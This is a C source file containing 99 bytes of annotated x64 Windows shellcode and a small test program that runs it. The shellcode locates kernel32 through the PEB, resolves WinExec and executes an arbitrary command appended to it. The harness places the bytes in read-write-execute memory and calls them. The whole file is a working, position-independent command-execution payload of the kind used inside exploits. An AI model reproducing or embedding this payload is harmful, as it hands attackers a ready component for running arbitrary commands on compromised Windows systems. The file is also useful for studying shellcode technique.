
#include <windows.h>
#include <stdio.h>

#define MAX_CMD_LEN 255

/* Copyright (c) 2014 Kevin Devine */
/* Size = 99 bytes */

char exec64[] = {
  /* 0000 */  "\x53"                          /*  push rbx                           */
  /* 0001 */  "\x56"                          /*  push rsi                           */
  /* 0002 */  "\x57"                          /*  push rdi                           */
  /* 0003 */  "\x55"                          /*  push rbp                           */
  /* 0004 */  "\x48\x83\xEC\x48"              /*  sub rsp, 48h                       */
  /* 0008 */  "\xEB\x54"                      /*  jmp 0000005Eh                      */
  /* 000A */  "\x6A\x60"                      /*  push 00000060h                     */
  /* 000C */  "\x59"                          /*  pop rcx                            */
  /* 000D */  "\x65\x48\x8B\x31"              /*  mov rsi, qword ptr [rcx]           */
  /* 0011 */  "\x48\x8B\x76\x18"              /*  mov rsi, qword ptr [rsi+18h]       */
  /* 0015 */  "\x48\x8B\x76\x10"              /*  mov rsi, qword ptr [rsi+10h]       */
  /* 0019 */  "\x48\xAD"                      /*  lodsq                              */
  /* 001B */  "\x48\x8B\x30"                  /*  mov rsi, qword ptr [rax]           */
  /* 001E */  "\x48\x8B\x6E\x30"              /*  mov rbp, qword ptr [rsi+30h]       */
  /* 0022 */  "\x8B\x45\x3C"                  /*  mov eax, dword ptr [rbp+3Ch]       */
  /* 0025 */  "\x03\xC1"                      /*  add eax, ecx                       */
  /* 0027 */  "\x8B\x5C\x28\x28"              /*  mov ebx, dword ptr [rax+rbp+28h]   */
  /* 002B */  "\x48\x8D\x74\x2B\x1C"          /*  lea rsi, qword ptr [rbx+rbp+1Ch]   */
  /* 0030 */  "\xB1\x03"                      /*  mov cl, 03h                        */
  /* 0032 */  "\xAD"                          /*  lodsd                              */
  /* 0033 */  "\x48\x03\xC5"                  /*  add rax, rbp                       */
  /* 0036 */  "\x50"                          /*  push rax                           */
  /* 0037 */  "\xE2\xF9"                      /*  loop 00000032h                     */
  /* 0039 */  "\x5F"                          /*  pop rdi                            */
  /* 003A */  "\x5E"                          /*  pop rsi                            */
  /* 003B */  "\x5B"                          /*  pop rbx                            */
  /* 003C */  "\x0F\xB7\x14\x4F"              /*  movzx edx, word ptr [rdi+rcx*2]    */
  /* 0040 */  "\xFF\xC1"                      /*  inc ecx                            */
  /* 0042 */  "\xAD"                          /*  lodsd                              */
  /* 0043 */  "\x81\x3C\x28\x57\x69\x6E\x45"  /*  cmp dword ptr [rax+rbp], 456E6957h */
  /* 004A */  "\x75\xF0"                      /*  jne 0000003Ch                      */
  /* 004C */  "\x8B\x04\x93"                  /*  mov eax, dword ptr [rbx+rdx*4]     */
  /* 004F */  "\x48\x03\xC5"                  /*  add rax, rbp                       */
  /* 0052 */  "\x59"                          /*  pop rcx                            */
  /* 0053 */  "\xFF\xD0"                      /*  call rax                           */
  /* 0055 */  "\x48\x83\xC4\x48"              /*  add rsp, 48h                       */
  /* 0059 */  "\x5D"                          /*  pop rbp                            */
  /* 005A */  "\x5F"                          /*  pop rdi                            */
  /* 005B */  "\x5E"                          /*  pop rsi                            */
  /* 005C */  "\x5B"                          /*  pop rbx                            */
  /* 005D */  "\xC3"                          /*  ret                                */
  /* 005E */  "\xE8\xA7\xFF\xFF\xFF"          /*  call 0000000Ah                     */
};

int main (int argc, char* argv[]) {
  
  puts ("\nCopyright (c) 2014 Kevin Devine\n");
    
  if (argc != 2) {
    printf ("\nUsage: exec64_test <255-byte command>");
    printf ("\nExample: exec64_test \"cmd /c calc\"\n");
    return 0;
  }
  
  char *cmd = argv[1];
  size_t cmd_len = strlen (cmd);
  
  if (cmd_len > MAX_CMD_LEN) {
    printf ("\nCommand exceeds WinExec() limit of %i bytes", MAX_CMD_LEN);
    return 0;
  }
  
  void *exec = VirtualAlloc(0, strlen (exec64) + MAX_CMD_LEN + 1, 
      MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  memcpy (exec, exec64, strlen (exec64));
  strcat ((char*)exec, cmd);
  printf ("\nAssembly : %i\nFinal Size : %i", 
    strlen (exec64), 
    cmd_len + strlen (exec64));
  //DebugBreak();
  ((void(*)())exec)();
  VirtualFree (exec, 0, MEM_RELEASE);
  return 0;
}

